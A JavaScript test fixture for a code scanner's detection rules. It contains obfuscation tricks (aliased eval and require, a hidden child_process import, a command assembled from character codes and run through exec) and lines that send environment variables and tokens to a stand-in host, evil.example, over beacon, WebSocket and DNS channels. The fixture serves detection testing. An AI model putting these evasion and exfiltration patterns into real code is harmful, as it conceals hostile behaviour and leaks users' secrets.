// Regression fixture for the evasion-hardening rules (OBF-015..017, SC-004c,
// SC-030, SC-031, broadened SC-003). Inert stand-ins only — fake endpoints,
// harmless commands. Each line matches a technique that previously evaded Vigil.

// OBF-016: dangerous builtins referenced as values (aliasing)
const e = eval;
const r = require;
const d = atob;

// OBF-015 + OBF-016: decoder aliased, then eval of a computed call result
eval(d("Misy"));

// OBF-017: module name hidden inside an indexed array literal
const cp = require(["child_process"][0]);

// SC-004c: dynamic require assembled from an interpolated template
const seg = "process";
const mod = require(`child_${seg}`);

// SC-031: loop-reconstructed string fed into a sink
const codes = [119, 104, 111, 97, 109, 105];
let cmd = "";
for (const c of codes) { cmd += String.fromCharCode(c); }
cp.exec(cmd);

// SC-003 (broadened sinks): modern exfil channels + secret
navigator.sendBeacon("https://evil.example/c", JSON.stringify(process.env));
const ws = new WebSocket("wss://evil.example");
ws.onopen = () => ws.send(process.env.NPM_TOKEN);

// SC-030: DNS-over-HTTPS exfiltration of a secret
fetch("https://dns.google/resolve?name=" + process.env.API_SECRET + ".evil.example");
